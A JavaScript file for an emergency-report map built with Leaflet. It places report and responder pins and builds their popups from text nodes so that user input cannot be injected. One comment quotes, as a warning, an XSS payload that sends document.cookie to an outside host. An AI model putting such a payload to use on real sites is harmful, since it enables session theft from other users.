// Keep the tiles we load, so the map still draws where you have already been
// when the network goes. Registered from here rather than on every page: the
// map is the only thing that benefits, and a service worker somebody didn't
// ask for is a surprise.
//
// Needs HTTPS or localhost — browsers refuse to register one otherwise — so
// this quietly does nothing during development over a LAN address.
if ("serviceWorker" in navigator) {
    window.addEventListener("load", () => {
        navigator.serviceWorker.register("/sw.js").catch(() => {
            // Unsupported, blocked, or not a secure context. The map works
            // exactly as before; it just won't remember anything.
        });
    });
}

// Katy, TX. Only ever seen if there are no located reports at all.
const FALLBACK = [29.7858,-95.8244];

const map = L.map("map").setView(FALLBACK,11);

const reports = JSON.parse(
    document.getElementById("reports-data").textContent
);

L.tileLayer(
"https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png",
{
    attribution:"© OpenStreetMap"
}
).addTo(map);

let high=0;
let medium=0;
let low=0;

const markers=[];

// Report pins. A subject is whatever the person who filed it typed, so this
// is built out of text nodes for the same reason the responder popup below
// is — see the long comment there. Every pin on this map has one of these,
// which makes it the widest version of that hole rather than the narrowest.
function reportPopup(report){

    const box=document.createElement("div");

    const title=document.createElement("strong");
    title.textContent=report.subject;

    const priority=document.createElement("div");
    priority.textContent=report.priority;

    const link=document.createElement("a");
    // Number() rather than the raw value: this is the one field that ends up
    // in a URL, and an id of "javascript:..." should not survive the trip.
    link.setAttribute("href","/report/"+Number(report.id));
    link.textContent="Open Report";

    box.append(title,document.createElement("br"),priority,link);
    return box;
}

reports.forEach(report=>{

    if(report.priority==="HIGH") high++;
    if(report.priority==="MEDIUM") medium++;
    if(report.priority==="LOW") low++;

    const marker=L.marker([report.latitude,report.longitude])
    .addTo(map)
    .bindPopup(reportPopup(report));

    marker.subject=report.subject.toLowerCase();

    markers.push(marker);

});

// The newest report is the one you opened the map to look at, so it goes in
// the middle. Then push the edges out far enough that everything else still
// fits — mirroring the furthest pin keeps the newest one dead centre instead
// of letting fitBounds drift towards wherever the crowd is.
if(reports.length){

    const newest=[...reports].sort(
        (a,b)=>b.created_at.localeCompare(a.created_at)
    )[0];

    const centre=[newest.latitude,newest.longitude];

    let reach=0;

    reports.forEach(report=>{
        reach=Math.max(
            reach,
            Math.abs(report.latitude-centre[0]),
            Math.abs(report.longitude-centre[1])
        );
    });

    if(reach===0){
        map.setView(centre,14);
    }else{
        map.fitBounds([
            [centre[0]-reach,centre[1]-reach],
            [centre[0]+reach,centre[1]+reach],
        ],{padding:[40,40]});
    }

}

document.getElementById("high").textContent=high;
document.getElementById("medium").textContent=medium;
document.getElementById("low").textContent=low;

document.getElementById("search")
.addEventListener("input",e=>{

const text=e.target.value.toLowerCase();

markers.forEach(marker=>{

if(marker.subject.includes(text)){

marker.addTo(map);

}else{

map.removeLayer(marker);

}

});

});

function getResponderColor(state){

    switch(state){

        case "overdue":
            return "#f38ba8";

        case "on_scene":
            return "#a6e3a1";

        case "en_route":
            return "#89b4fa";

        case "available":
            return "#a6adc8";

        default:
            return "#cdd6f4";
    }

}

function formatState(state){

    switch(state){

        case "on_scene":
            return "On Scene";

        case "en_route":
            return "En Route";

        case "overdue":
            return "Overdue";

        case "available":
            return "Available";

        default:
            return state;
    }

}

// Built out of DOM nodes rather than an HTML string, deliberately.
//
// A report subject is free text typed by whoever filed the report, and it
// reaches this line exactly as they typed it. Dropped into innerHTML, a
// subject of
//
//     <img src=x onerror="fetch('https://elsewhere/'+document.cookie)">
//
// runs in the browser of every coordinator who opens this pin — and the
// people opening these pins are the ones with the session worth stealing.
//
// Usernames happen to be safe today: signup restricts them to
// [A-Za-z0-9._-]. But a line is not secure because of a rule enforced four
// hundred lines away in another file, and that rule only has to be relaxed
// once. textContent cannot be talked into executing anything, so it does
// all of the work here.
function responderPopup(responder) {

    const box = document.createElement("div");

    const name = document.createElement("strong");
    name.textContent = responder.username;
    box.append(name, document.createElement("br"));

    // The template literals below are safe because the result becomes a
    // text node. It is never parsed as markup.
    const add = (text) => box.append(document.createTextNode(text),
                                     document.createElement("br"));

    add(`Status: ${formatState(responder.state)}`);

    add(responder.assignment
        ? `Assignment: ${responder.assignment.report_subject}`
        : "Available");

    add(`Last check-in: ${new Date(responder.last_position.at).toLocaleString()}`);

    return box;
}

fetch("/api/responders")
    .then(res => res.json())
    .then(responders => {

        responders.forEach(responder => {

            if (!responder.last_position) return;

            const { lat, lng } = responder.last_position;

            const marker = L.circleMarker([lat, lng], {
                radius: 8,
                color: getResponderColor(responder.state),
                fillColor: getResponderColor(responder.state),
                fillOpacity: 1,
                weight: 2
            }).addTo(map);

            marker.bindPopup(responderPopup(responder));

        });

    })
    // The reports on this map came from the server with the page. The
    // responder pins are a second request, and it is the one that fails
    // when the network is bad — which is when somebody is most likely to
    // be staring at this screen. Failing quietly leaves a map that looks
    // complete and is missing every responder on it, so say so.
    .catch(() => {
        const warning = document.createElement("div");
        warning.className = "map-warning";
        warning.setAttribute("role", "status");
        warning.textContent =
            "Could not load responder positions. Reports are still shown.";
        document.body.appendChild(warning);
    });